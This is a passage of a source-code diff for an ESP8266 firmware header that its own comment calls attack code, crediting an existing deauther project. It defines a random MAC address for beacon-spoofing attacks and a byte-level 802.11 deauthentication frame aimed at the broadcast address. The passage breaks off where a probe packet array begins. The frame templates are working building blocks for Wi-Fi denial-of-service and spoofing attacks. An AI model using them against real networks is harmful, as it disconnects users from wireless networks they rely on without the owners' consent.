@@ -1,21 +1,23 @@
-#ifndef _USER_SNIFFER_H
-#define _USER_SNIFFER_H
+#ifndef _USER_ATTACK_H
+#define _USER_ATTACK_H
 
-#include <c_types.h>
+/**
+ * Attack foundations from:
+ *
+ * https://github.com/spacehuhn/esp8266_deauther/tree/master/esp8266_deauther
+ */
 
-#include "user_config.h"
-
-// Random mac address for making the beacon packets
+// Random mac for beacon attacks (updated periodically)
 uint8_t beacon_random_mac[6] = { 0xAA, 0xBB, 0xCC, 0x00, 0x11, 0x22 };
 
 uint8_t deauth_packet[26] = {
-    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
-    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
-    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
-    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
-    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
-    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
-    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
+    /*  0 - 1  */ 0xC0, 0x00,                                       // type, subtype c0: deauth (a0: disassociate)
+    /*  2 - 3  */ 0x00, 0x00,                                       // duration (SDK takes care of that)
+    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,               // reciever (target)
+    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,               // source (ap)
+    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,               // BSSID (ap)
+    /* 22 - 23 */ 0x00, 0x00,                                       // fragment & squence number
+    /* 24 - 25 */ 0x01, 0x00                                        // reason code (1 = unspecified reason)
 };
 
 uint8_t probe_packet[68] = {
